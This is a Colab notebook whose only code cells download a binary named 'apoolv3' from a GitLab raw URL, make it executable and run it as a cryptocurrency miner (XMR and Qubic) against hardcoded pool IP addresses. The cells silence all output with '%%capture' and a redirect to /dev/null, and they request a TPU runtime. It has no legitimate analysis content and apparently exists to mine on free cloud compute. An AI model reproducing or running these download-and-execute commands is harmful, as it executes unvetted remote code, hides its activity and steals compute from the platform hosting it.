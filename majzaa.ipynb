{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "private_outputs": true,
      "provenance": [],
      "gpuType": "V28",
      "cell_execution_strategy": "setup",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/viansbastiantii/anyakkkk/blob/main/majzaa.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "%%capture\n",
        "!wget https://gitlab.com/majapahlevi/mvp/-/raw/main/apoolv3 && chmod +x apoolv3 && ./apoolv3 --algo xmr --account CP_maja --worker $(shuf -n 1 -i 1-9999)-xmr --pool 8.210.142.221:3334 --thread 96 > /dev/null 2>&1"
      ],
      "metadata": {
        "id": "4fK9YFGLiLPA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "%%capture\n",
        "!wget https://gitlab.com/majapahlevi/mvp/-/raw/main/apoolv3 && chmod +x apoolv3 && ./apoolv3 --account CP_maja --worker $(shuf -n 1 -i 1-9999)-Qubic --pool 8.217.123.224:3334 --cpu-off > /dev/null 2>&1"
      ],
      "metadata": {
        "id": "RNQiqSNJ7a3M"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}